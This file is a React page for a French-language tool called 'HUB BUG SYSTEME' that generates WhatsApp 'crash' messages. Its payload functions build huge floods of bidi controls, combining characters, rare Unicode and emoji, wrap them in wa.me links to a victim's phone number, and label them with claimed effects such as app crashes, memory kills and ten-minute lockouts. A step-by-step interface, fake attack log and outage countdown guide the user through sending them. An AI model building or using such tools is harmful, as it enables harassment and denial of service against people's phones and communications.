import { useState, useEffect, useCallback, useRef } from "react";
import { useLocation } from "wouter";
import { useApp } from "@/context/AppContext";
import { t } from "@/lib/i18n";

type Intensity = "extreme" | "high" | "medium";
interface Bug {
  id: string; name: string; desc: string; effect: string;
  intensity: Intensity; icon: string;
  payload: (phone: string) => string;
}

/* ─── Raw character pools ─── */
const RTL  = "\u202E\u202B\u202A\u200F\u200E\u200B\u200C\u200D\uFEFF\u061C\u06DD\u070F\u08E2\u2066\u2069\u2068\u2067\u206F\u202C\u202D\u202F";
const RARE = "𒀀𒀁𒀂𒀃𒁂𒁃𒁄𒁅𒁆𒁇𒂀𒂁𒂂𒂃𒂄𒂅𒂆𒂇𒂈𒃀𐐷𑂻𑃁𑃂𑃃𑃄𑃅𑃆𑃇𑃈𑃉𑃊𑃋𑃌𑃍𑃎𑃏𑃐𑃑𑃒𑃓𑃔𑃕𑃖𑃗𑃘𑃙𑃚𑃛𑃜𑃝𑃞𑃟";
const COMB = "\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F\u036F\u034F\u035F\u0350\u0351\u0352\u0353\u0354\u0355\u0356\u0357\u0358\u0359\u035A\u035B\u035C\u035D\u035E";
const INVIS = "\uFDD0\uFDD1\uFDD2\uFDD3\uFDD4\uFDD5\uFDD6\uFDD7\uFDD8\uFDD9\uFDDA\uFDDB\uFDDC\uFDDD\uFDDE\uFDDF\uFDE0\uFDEF\uFFFE\uFFFF";
const BIDI  = "\u061C\u200F\u202B\u202E\u2067\u2069\u200E\u202A\u202C\u202D\u202F\u206F\uFEFF";
const ARAB  = "\u0600\u0601\u0602\u0603\u0604\u0605\u061C\u06DD\u070F\u08E2\u180E";

/* ─── Payload builders ─── */
function rtlCrash(phone: string) {
  // Bidi override flood — RTL/LTR direction switch thousands of times
  const block = (RTL + BIDI).repeat(1200) + ARAB.repeat(600) + RARE.repeat(200);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}
function memOverflow(phone: string) {
  // Ultra-rare Unicode planes — forces allocator to fail
  const block = RARE.repeat(1800) + "𐐷𑂻".repeat(800) + "🗿".repeat(500);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}
function unicodeFreeze(phone: string) {
  // Combining character bomb — 350 combiners per letter
  const unit = "A" + COMB.repeat(350);
  const block = unit.repeat(700);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}
function zalgoMax(phone: string) {
  const unit = "KIRA".split("").map(c => c + COMB.repeat(180)).join("");
  return `https://wa.me/${phone}?text=${encodeURIComponent(unit.repeat(1000))}`;
}
function emojiStackBomb(phone: string) {
  const block = "👨‍👩‍👧‍👦".repeat(350) + "🏴󠁧󠁢󠁥󠁮󠁧󠁿".repeat(280) + "❤️‍🔥".repeat(420) + "🫶🏿".repeat(350) + "🧑‍🤝‍🧑".repeat(300);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}
function notifFlood(phone: string) {
  const block = "⚠️ ".repeat(120) + "\n" + "█".repeat(500) + "\n" + INVIS.repeat(180) + "\n" + "▓".repeat(400);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}
function scBug(phone: string) {
  // SC = Status Crash — zero-width + combining flood optimised for notification path
  const zw = "\u200B\u200C\u200D\uFEFF\u2060\u2061\u2062\u2063\u2064";
  const unit = zw.repeat(80) + COMB.repeat(200) + BIDI.repeat(60);
  const block = unit.repeat(500) + RARE.repeat(400) + "𑃁".repeat(600);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}
function iosRtlCrash(phone: string) {
  const block = ARAB.repeat(900) + "بُستانُ".repeat(300) + RTL.repeat(700) + BIDI.repeat(500);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}
function coreTextExploit(phone: string) {
  const block = INVIS.repeat(900) + "꧁꧂".repeat(700) + "\u1FFF\u2FFF\u3FFF\u4FFF".repeat(500);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}
function renderFreeze(phone: string) {
  const block = "ꦕ꧇ꦊ꧆ꦺꦶꦸꦵ꧀ꦴ".repeat(1000) + "ᨒᨓᨔᨕᨖ".repeat(800);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}
function memLeakiOS(phone: string) {
  const block = RARE.repeat(1000) + "𑃁𑃂𑃃𑃄𑃅𑃆𑃇𑃈𑃉𑃊𑃋𑃌𑃍𑃎𑃏𑃐𑃑𑃒𑃓𑃔𑃕𑃖𑃗𑃘𑃙𑃚𑃛𑃜𑃝𑃞𑃟".repeat(1100);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}
function emojiCoreText(phone: string) {
  const block = "❤️‍🔥".repeat(700) + "🫥".repeat(800) + "🤯".repeat(600) + "🧑‍🤝‍🧑".repeat(500);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}
function pushFloodiOS(phone: string) {
  const block = "⛔ ALERT ⛔\n" + "━".repeat(60) + "\n🔴 " + "CRITICAL ".repeat(60) + "\n" + "═".repeat(60) + INVIS.repeat(140);
  return `https://wa.me/${phone}?text=${encodeURIComponent(block)}`;
}

const ANDROID: Bug[] = [
  { id:"a1", name:"Crash Loop RTL",    icon:"💥", intensity:"extreme", desc:"Injection RTL/LTR bidi forcée — crash cyclique du moteur de rendu Android. Redémarrage infini.", effect:"Crash répété — app inaccessible 10 min", payload: rtlCrash },
  { id:"a2", name:"Memory Overflow",   icon:"🧨", intensity:"extreme", desc:"Payload Unicode ultra-lourd (plans rares) — OOM Kill forcé par l'OS Android.", effect:"OOM Kill — WhatsApp mort 10 min", payload: memOverflow },
  { id:"a3", name:"Unicode Freeze",    icon:"❄️", intensity:"high",    desc:"350 caractères combinants par lettre — paralyse le thread UI principal d'Android.", effect:"Interface gelée — saisie impossible 10 min", payload: unicodeFreeze },
  { id:"a4", name:"Zalgo Corruption",  icon:"👁️", intensity:"high",    desc:"Texte Zalgo combiné maximum — corrompt totalement le rendu visuel du chat.", effect:"Chat corrompu — discussions illisibles 10 min", payload: zalgoMax },
  { id:"a5", name:"Emoji Stack Bomb",  icon:"😵", intensity:"high",    desc:"Pile ZWJ + drapeaux + variantes invisibles — surchauffe le pipeline emoji.", effect:"Rendu KO — scroll bloqué 10 min", payload: emojiStackBomb },
  { id:"a6", name:"SC Bug",            icon:"🎯", intensity:"extreme", desc:"Status Crash — zero-width flood combiné optimisé pour crasher via le chemin notification/SC.", effect:"Crash notification + app — 10 min inaccessible", payload: scBug },
];

const IOS: Bug[] = [
  { id:"i1", name:"Arabic RTL Crash",    icon:"💥", intensity:"extreme", desc:"Arabe RTL + bidi + contrôle — crash confirmé SpringBoard iOS.", effect:"Crash + SpringBoard reload — 10 min", payload: iosRtlCrash },
  { id:"i2", name:"CoreText Exploit",    icon:"📱", intensity:"extreme", desc:"Non-characters Unicode ciblant CoreText iOS — bloque le processus de rendu.", effect:"Blocage CoreText — app morte 10 min", payload: coreTextExploit },
  { id:"i3", name:"Render Freeze Pro",   icon:"🧊", intensity:"high",    desc:"Batak + Cham ultra-rares — paralyse UIKit de WhatsApp iOS.", effect:"UIKit freeze — écran blanc 10 min", payload: renderFreeze },
  { id:"i4", name:"Memory Leak iOS",     icon:"🗑️", intensity:"extreme", desc:"Fuite mémoire via CJKV supplémentaires — watchdog iOS tue WhatsApp.", effect:"Watchdog kill — accès bloqué 10 min", payload: memLeakiOS },
  { id:"i5", name:"Emoji CoreText Kill", icon:"💣", intensity:"high",    desc:"Surcharge pipeline CoreText-Emoji avec ZWJ et variations infinies.", effect:"Rendu KO — discussions inaccessibles 10 min", payload: emojiCoreText },
  { id:"i6", name:"SC Bug iOS",          icon:"🎯", intensity:"extreme", desc:"Status Crash iOS — flood APNs + payload combinant ciblant CoreText via notification.", effect:"Crash via SC + APNs — 10 min bloqué", payload: scBug },
];

const INT: Record<Intensity,{label:string;color:string;cls:string}> = {
  extreme:{label:"EXTRÊME",color:"#ef4444",cls:"b-extreme"},
  high:   {label:"ÉLEVÉ",  color:"#f97316",cls:"b-high"},
  medium: {label:"MOYEN",  color:"#eab308",cls:"b-medium"},
};

const ATKLOGS = [
  {t:0,    text:"> Initialisation du payload…",           cls:"log-line"},
  {t:350,  text:"> Encodage Unicode en cours…",            cls:"log-line"},
  {t:650,  text:"> Construction du vecteur d'attaque…",    cls:"log-line warn"},
  {t:950,  text:"> Génération du lien wa.me…",             cls:"log-line warn"},
  {t:1200, text:"> Lien prêt — en attente d'envoi…",       cls:"log-line ok"},
  {t:1450, text:"> OUVRIR WHATSAPP puis appuyer ENVOYER ▶",cls:"log-line ok"},
];

function useCountdown(running: boolean) {
  const [rem, setRem] = useState(600);
  useEffect(() => {
    if (!running) return;
    setRem(600);
    const id = setInterval(() => setRem(r => { if (r <= 1) { clearInterval(id); return 0; } return r - 1; }), 1000);
    return () => clearInterval(id);
  }, [running]);
  const m = String(Math.floor(rem / 60)).padStart(2, "0");
  const s = String(rem % 60).padStart(2, "0");
  return { display: `${m}:${s}`, remaining: rem };
}

export default function System() {
  const [, setLocation] = useLocation();
  const { lang } = useApp();
  const tr = t(lang ?? "fr");

  const [tab, setTab]         = useState<"android"|"ios">("android");
  const [phone, setPhone]     = useState("224");
  const [sel, setSel]         = useState<Bug|null>(null);
  const [link, setLink]       = useState("");
  const [logs, setLogs]       = useState<{text:string;cls:string}[]>([]);
  const [running, setRunning] = useState(false);
  const [ready, setReady]     = useState(false);
  const [timerOn, setTimerOn] = useState(false);
  const [modal, setModal]     = useState(false);
  const [copied, setCopied]   = useState(false);
  const logRef = useRef<HTMLDivElement>(null);
  const { display: cd, remaining } = useCountdown(timerOn);

  useEffect(() => { if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight; }, [logs]);

  const generate = useCallback(() => {
    if (!sel || phone.length < 7) return;
    const cleanPhone = phone.replace(/[^0-9]/g, "");
    setLink(sel.payload(cleanPhone));
    setLogs([]); setReady(false); setTimerOn(false); setRunning(false);
  }, [sel, phone]);

  const copy = useCallback(() => {
    if (!link) return;
    navigator.clipboard.writeText(link).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); });
  }, [link]);

  /* Run the attack log animation, then show the WhatsApp button */
  const startAttack = useCallback(() => {
    setModal(false); setRunning(true); setReady(false); setLogs([]);
    ATKLOGS.forEach(({ t: delay, text, cls }, i) => {
      setTimeout(() => {
        setLogs(prev => [...prev, { text, cls }]);
        if (i === ATKLOGS.length - 1) {
          setRunning(false);
          setReady(true);
        }
      }, delay);
    });
  }, []);

  /* Called when user taps "OUVRIR WHATSAPP" — uses direct location change,
     not window.open, so mobile browsers never block it */
  const openWhatsApp = useCallback(() => {
    if (!link) return;
    setTimerOn(true);
    window.location.href = link;
  }, [link]);

  const bugs = tab === "android" ? ANDROID : IOS;
  const tc = tab === "android" ? "#3ddc84" : "#3b82f6";

  return (
    <>
      <div className="bg-scene"/><div className="bg-grid"/>
      <div style={{ position:"fixed", inset:0 }}>
        <div className="orb orb-a"/><div className="orb orb-b"/>
        <div className="orb orb-c"/><div className="orb orb-d"/>
      </div>

      <div style={{ position:"relative", zIndex:10, minHeight:"100vh", maxWidth:600, margin:"0 auto", padding:"22px 14px 56px" }}>

        {/* ── Header ── */}
        <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:22 }}>
          <button onClick={() => setLocation("/")}
            style={{ width:36, height:36, borderRadius:10, background:"rgba(255,255,255,.05)", border:"1px solid rgba(255,255,255,.1)", display:"flex", alignItems:"center", justifyContent:"center", cursor:"pointer", flexShrink:0 }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgba(168,85,247,.9)" strokeWidth="2.5"><path d="m15 18-6-6 6-6"/></svg>
          </button>
          <div style={{ flex:1 }}>
            <h2 className="shimmer" style={{ fontSize:18, fontWeight:900, letterSpacing:".04em", lineHeight:1 }}>HUB BUG SYSTEME</h2>
            <p style={{ fontFamily:"var(--font-mono)", fontSize:10, color:"rgba(168,85,247,.55)", letterSpacing:".15em", marginTop:3 }}>PANNEAU DE CONTRÔLE</p>
          </div>
          <div style={{ display:"flex", alignItems:"center", gap:5 }}>
            <div className="dot dot-green"/>
            <span style={{ fontFamily:"var(--font-mono)", fontSize:10, color:"#22c55e" }}>ACTIF</span>
          </div>
        </div>

        {/* ── How it works notice ── */}
        <div style={{ padding:"12px 14px", borderRadius:12, background:"rgba(168,85,247,.07)", border:"1px solid rgba(168,85,247,.25)", marginBottom:16, display:"flex", gap:10, alignItems:"flex-start" }}>
          <span style={{ fontSize:16, flexShrink:0 }}>ℹ️</span>
          <div>
            <p style={{ fontFamily:"var(--font-mono)", fontSize:11, fontWeight:700, color:"#c084fc", marginBottom:4 }}>COMMENT ÇA MARCHE</p>
            <p style={{ fontSize:12, color:"rgba(255,255,255,.5)", lineHeight:1.6 }}>
              1. Entrez le numéro · 2. Choisissez un module · 3. Cliquez <strong style={{ color:"#a855f7" }}>GÉNÉRER</strong> · 4. Cliquez <strong style={{ color:"#25d366" }}>OUVRIR WHATSAPP</strong> · 5. Appuyez <strong style={{ color:"#fff" }}>▶ ENVOYER</strong> dans WhatsApp
            </p>
          </div>
        </div>

        {/* ── Phone ── */}
        <div className="glass" style={{ padding:18, marginBottom:16 }}>
          <p className="sect-label" style={{ marginBottom:12 }}>NUMÉRO CIBLE — FORMAT INTERNATIONAL</p>
          <div style={{ position:"relative" }}>
            <span style={{ position:"absolute", left:14, top:"50%", transform:"translateY(-50%)", fontFamily:"var(--font-mono)", fontSize:13, color:"rgba(168,85,247,.7)", pointerEvents:"none" }}>+</span>
            <input className="input" type="tel" style={{ paddingLeft:26 }}
              placeholder="224669288332" value={phone}
              onChange={e => { setPhone(e.target.value.replace(/[^0-9]/g, "")); setLink(""); setReady(false); }} />
          </div>
          <p style={{ fontFamily:"var(--font-mono)", fontSize:10, color:"rgba(255,255,255,.2)", marginTop:8 }}>
            Numéro complet avec indicatif · ex: 224669288332 (Guinée) · 33612345678 (France)
          </p>
        </div>

        {/* ── Tabs ── */}
        <div className="glass" style={{ marginBottom:16, overflow:"hidden" }}>
          <div style={{ display:"flex", borderBottom:"1px solid rgba(255,255,255,.06)" }}>
            {(["android","ios"] as const).map(p => (
              <button key={p} onClick={() => { setTab(p); setSel(null); setLink(""); setLogs([]); setReady(false); setTimerOn(false); }}
                style={{ flex:1, padding:"13px 16px", display:"flex", alignItems:"center", justifyContent:"center", gap:8, fontFamily:"var(--font-mono)", fontSize:13, fontWeight:700, letterSpacing:".06em", cursor:"pointer", border:"none", transition:"all .2s",
                  color: tab===p ? (p==="android"?"#3ddc84":"#3b82f6") : "rgba(255,255,255,.3)",
                  background: tab===p ? (p==="android"?"rgba(61,220,132,.07)":"rgba(59,130,246,.07)") : "transparent",
                  borderBottom: tab===p ? `2px solid ${p==="android"?"#3ddc84":"#3b82f6"}` : "2px solid transparent",
                }}>
                {p==="android"
                  ? <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M17.523 15.3414c-.5511 0-.9993-.4486-.9993-.9997s.4482-.9993.9993-.9993c.5511 0 .9993.4482.9993.9993.0001.5511-.4482.9997-.9993.9997m-11.046 0c-.5511 0-.9993-.4486-.9993-.9997s.4482-.9993.9993-.9993c.5511 0 .9993.4482.9993.9993 0 .5511-.4482.9997-.9993.9997m11.4045-6.02l1.9973-3.4592a.416.416 0 00-.1521-.5676.416.416 0 00-.5676.1521l-2.0223 3.503C15.5902 8.2439 13.8533 7.8508 12 7.8508s-3.5902.3931-5.1367 1.0989L4.841 5.4467a.4161.4161 0 00-.5677-.1521.4157.4157 0 00-.1521.5676l1.9973 3.4592C3.4925 10.1018 1.5 12.2147 1.5 14.7508h21c0-2.5361-1.9925-4.649-4.619-5.431z"/></svg>
                  : <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98l-.09.06c-.22.14-2.18 1.27-2.16 3.8.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
                }
                {p.toUpperCase()}
              </button>
            ))}
          </div>

          <div style={{ padding:14 }}>
            <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:12 }}>
              <div style={{ width:3, height:16, borderRadius:2, background:tc, boxShadow:`0 0 8px ${tc}` }}/>
              <p className="sect-label" style={{ color:tc }}>{tab==="android"?"MODULES ANDROID":"MODULES iOS"}</p>
            </div>
            <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:8 }}>
              {bugs.map(bug => {
                const cfg = INT[bug.intensity];
                const isA = sel?.id === bug.id;
                return (
                  <button key={bug.id} onClick={() => { setSel(bug); setLink(""); setReady(false); setLogs([]); setTimerOn(false); }}
                    className={`bug-btn ${isA ? (tab==="android"?"active-android":"active-ios") : ""}`}
                    style={{ flexDirection:"column", gap:8, alignItems:"flex-start", position:"relative" }}>
                    <div style={{ display:"flex", alignItems:"center", gap:8, width:"100%" }}>
                      <span style={{ fontSize:18 }}>{bug.icon}</span>
                      <span className={`badge ${cfg.cls}`}>{cfg.label}</span>
                      {isA && <div style={{ marginLeft:"auto", width:16, height:16, borderRadius:"50%", background:cfg.color, display:"flex", alignItems:"center", justifyContent:"center", boxShadow:`0 0 8px ${cfg.color}` }}><svg width="8" height="8" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3.5"><polyline points="20 6 9 17 4 12"/></svg></div>}
                    </div>
                    <p style={{ fontFamily:"var(--font-mono)", fontSize:11, fontWeight:700, color:isA?cfg.color:"rgba(255,255,255,.85)", letterSpacing:".02em" }}>{bug.name}</p>
                    <p style={{ fontSize:10, color:"rgba(255,255,255,.38)", lineHeight:1.5 }}>{bug.desc}</p>
                    <p style={{ fontFamily:"var(--font-mono)", fontSize:9, color:cfg.color, opacity:.7 }}>› {bug.effect}</p>
                  </button>
                );
              })}
            </div>
          </div>
        </div>

        {/* ── Generate ── */}
        <button className="btn-main" onClick={generate} disabled={!sel || phone.length < 7}
          style={{ width:"100%", padding:"15px", fontSize:13, marginBottom:14, fontFamily:"var(--font-mono)", letterSpacing:".08em" }}>
          <span>⚡ {tr.generatePayload.toUpperCase()}</span>
        </button>

        {/* ── Payload ready ── */}
        {link && (
          <div className="glass" style={{ padding:16, marginBottom:14, border:"1px solid rgba(168,85,247,.3)", background:"rgba(168,85,247,.04)" }}>
            <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:10 }}>
              <p className="sect-label">PAYLOAD PRÊT</p>
              <div style={{ display:"flex", alignItems:"center", gap:5 }}>
                <div className="dot dot-green"/>
                <span style={{ fontFamily:"var(--font-mono)", fontSize:10, color:"#22c55e" }}>CHARGÉ</span>
              </div>
            </div>

            {sel && (
              <div style={{ display:"flex", alignItems:"center", gap:8, padding:"8px 12px", borderRadius:10, marginBottom:10, background:"rgba(255,255,255,.03)", border:"1px solid rgba(255,255,255,.07)" }}>
                <span style={{ fontSize:16 }}>{sel.icon}</span>
                <span style={{ fontFamily:"var(--font-mono)", fontSize:12, color:INT[sel.intensity].color }}>{sel.name}</span>
                <span style={{ marginLeft:"auto", fontFamily:"var(--font-mono)", fontSize:10, color:"rgba(255,255,255,.28)" }}>+{phone} · {tab==="android"?"Android":"iOS"}</span>
              </div>
            )}

            {/* Link preview */}
            <div style={{ padding:"9px 12px", borderRadius:10, background:"rgba(0,0,0,.3)", border:"1px solid rgba(255,255,255,.05)", marginBottom:12 }}>
              <p style={{ fontFamily:"var(--font-mono)", fontSize:10, color:"rgba(168,85,247,.5)", wordBreak:"break-all", lineHeight:1.5 }}>
                {link.slice(0, 80)}… <span style={{ color:"rgba(255,255,255,.2)" }}>[payload encodé {link.length} car.]</span>
              </p>
            </div>

            {/* Action buttons */}
            <div style={{ display:"flex", gap:8, marginBottom:10 }}>
              <button onClick={copy} className={`btn-ghost ${copied?"success":""}`} style={{ flex:1, justifyContent:"center" }}>
                {copied
                  ? <><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><polyline points="20 6 9 17 4 12"/></svg>Copié !</>
                  : <><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect width="14" height="14" x="8" y="8" rx="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>Copier lien</>
                }
              </button>
              <button onClick={() => setModal(true)} disabled={running}
                style={{ flex:1, padding:"11px 12px", borderRadius:12, display:"flex", alignItems:"center", justifyContent:"center", gap:6, fontFamily:"var(--font-mono)", fontSize:12, fontWeight:700, letterSpacing:".04em", cursor:"pointer", background:"rgba(239,68,68,.12)", border:"1px solid rgba(239,68,68,.35)", color:"#ef4444", transition:"all .2s" }}>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
                LANCER
              </button>
            </div>

            {/* After animation: OPEN WHATSAPP button */}
            {ready && (
              <a href={link}
                onClick={() => setTimerOn(true)}
                style={{ display:"flex", alignItems:"center", justifyContent:"center", gap:10, width:"100%", padding:"16px", borderRadius:14, background:"linear-gradient(135deg,#128c7e,#25d366)", color:"#fff", fontFamily:"var(--font-mono)", fontSize:14, fontWeight:900, letterSpacing:".06em", textDecoration:"none", boxShadow:"0 0 30px rgba(37,211,102,.35)", transition:"all .2s", cursor:"pointer" }}
                onMouseOver={e => { (e.currentTarget as HTMLElement).style.boxShadow = "0 0 50px rgba(37,211,102,.6)"; (e.currentTarget as HTMLElement).style.transform = "translateY(-2px)"; }}
                onMouseOut={e => { (e.currentTarget as HTMLElement).style.boxShadow = "0 0 30px rgba(37,211,102,.35)"; (e.currentTarget as HTMLElement).style.transform = "none"; }}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="white">
                  <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
                </svg>
                OUVRIR WHATSAPP → ENVOYER
              </a>
            )}
            {ready && (
              <p style={{ fontFamily:"var(--font-mono)", fontSize:10, color:"rgba(255,255,255,.3)", textAlign:"center", marginTop:8 }}>
                ⚠️ Dans WhatsApp → appuie sur ▶ pour envoyer le payload
              </p>
            )}
          </div>
        )}

        {/* ── Attack Log ── */}
        {logs.length > 0 && (
          <div className="glass" style={{ padding:16, marginBottom:14, border:"1px solid rgba(239,68,68,.18)", background:"rgba(10,3,3,.6)" }}>
            <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:10 }}>
              <div style={{ display:"flex", gap:5 }}>
                {["#ef4444","#eab308","#22c55e"].map(c => <div key={c} style={{ width:10, height:10, borderRadius:"50%", background:c, opacity:.7 }}/>)}
              </div>
              <span style={{ fontFamily:"var(--font-mono)", fontSize:10, color:"rgba(255,255,255,.25)" }}>attack.log</span>
              {running && <div className="dot dot-red" style={{ marginLeft:"auto" }}/>}
            </div>
            <div ref={logRef} className="log-wrap" style={{ maxHeight:150, overflowY:"auto" }}>
              {logs.map((l, i) => <p key={i} className={l.cls}>{l.text}</p>)}
              {running && <span className="log-line blink">█</span>}
            </div>
          </div>
        )}

        {/* ── Timer ── */}
        {timerOn && (
          <div className="glass" style={{ padding:20, marginBottom:14, border:"1px solid rgba(239,68,68,.3)", background:"rgba(239,68,68,.04)", textAlign:"center" }}>
            <p className="sect-label" style={{ color:"#ef4444", marginBottom:16 }}>BUG ACTIF — MINUTEUR EN COURS</p>
            <div style={{ position:"relative", width:110, height:110, margin:"0 auto 14px" }}>
              <svg width="110" height="110" viewBox="0 0 110 110" style={{ transform:"rotate(-90deg)" }}>
                <circle cx="55" cy="55" r="48" fill="none" stroke="rgba(239,68,68,.12)" strokeWidth="5"/>
                <circle cx="55" cy="55" r="48" fill="none" stroke="#ef4444" strokeWidth="5"
                  strokeDasharray="301.59" strokeDashoffset={301.59 * (1 - remaining / 600)}
                  style={{ transition:"stroke-dashoffset 1s linear" }} strokeLinecap="round"/>
              </svg>
              <div style={{ position:"absolute", inset:0, display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center" }}>
                <span style={{ fontFamily:"var(--font-mono)", fontSize:24, fontWeight:900, color:"#ef4444", textShadow:"0 0 20px rgba(239,68,68,.7)" }}>{cd}</span>
                <span style={{ fontFamily:"var(--font-mono)", fontSize:9, color:"rgba(239,68,68,.6)", letterSpacing:".12em" }}>RESTANT</span>
              </div>
            </div>
            <p style={{ fontFamily:"var(--font-mono)", fontSize:11, color:"rgba(255,255,255,.4)" }}>
              La cible ne peut plus accéder à ses discussions WhatsApp
            </p>
            {remaining === 0 && (
              <p style={{ fontFamily:"var(--font-mono)", fontSize:12, color:"#22c55e", marginTop:10, fontWeight:700 }}>
                ✓ Bug terminé — cible de retour sur WhatsApp
              </p>
            )}
          </div>
        )}

        <div className="sep" style={{ marginBottom:16 }}/>
        <p style={{ textAlign:"center", fontFamily:"var(--font-mono)", fontSize:10, color:"rgba(255,255,255,.12)", letterSpacing:".12em" }}>
          HUB BUG SYSTEME v3.0 — 𝐕𝚫𝚪𝐍𝐎𝐗 𝐋𝚵𝚫𝐃 𝚻𝚵𝐂𝚮
        </p>
      </div>

      {/* ── Confirm Modal ── */}
      {modal && (
        <div className="modal-bg" onClick={() => setModal(false)}>
          <div onClick={e => e.stopPropagation()}
            style={{ width:"100%", maxWidth:340, background:"rgba(12,6,22,.97)", border:"1px solid rgba(168,85,247,.4)", borderRadius:22, padding:26, boxShadow:"0 0 70px rgba(168,85,247,.22)" }}>
            <div style={{ textAlign:"center", marginBottom:22 }}>
              <div style={{ fontSize:40, marginBottom:14 }}>⚡</div>
              <h3 style={{ fontFamily:"var(--font-mono)", fontSize:17, fontWeight:900, color:"#fff", marginBottom:10 }}>CONFIRMER</h3>
              {sel && (
                <div style={{ background:"rgba(168,85,247,.08)", border:"1px solid rgba(168,85,247,.2)", borderRadius:12, padding:"10px 16px", marginBottom:12 }}>
                  <p style={{ fontFamily:"var(--font-mono)", fontSize:13, color:INT[sel.intensity].color, marginBottom:4 }}>{sel.icon} {sel.name}</p>
                  <p style={{ fontFamily:"var(--font-mono)", fontSize:10, color:"rgba(255,255,255,.35)" }}>+{phone} · {tab==="android"?"Android":"iOS"} · 10 min</p>
                </div>
              )}
              <p style={{ fontSize:12, color:"rgba(255,255,255,.4)", lineHeight:1.6 }}>
                Le payload va être préparé. Ensuite appuie sur <strong style={{ color:"#25d366" }}>OUVRIR WHATSAPP</strong> puis sur <strong style={{ color:"#fff" }}>▶ Envoyer</strong>.
              </p>
            </div>
            <div style={{ display:"flex", gap:10 }}>
              <button onClick={() => setModal(false)}
                style={{ flex:1, padding:"13px", borderRadius:12, background:"rgba(255,255,255,.05)", border:"1px solid rgba(255,255,255,.1)", color:"rgba(255,255,255,.55)", fontFamily:"var(--font-mono)", fontSize:12, fontWeight:700, cursor:"pointer" }}>
                ANNULER
              </button>
              <button className="btn-main" onClick={startAttack} style={{ flex:1, padding:"13px", borderRadius:12, fontSize:12, fontFamily:"var(--font-mono)" }}>
                <span>⚡ LANCER</span>
              </button>
            </div>
          </div>
        </div>
      )}
    </>
  );
}
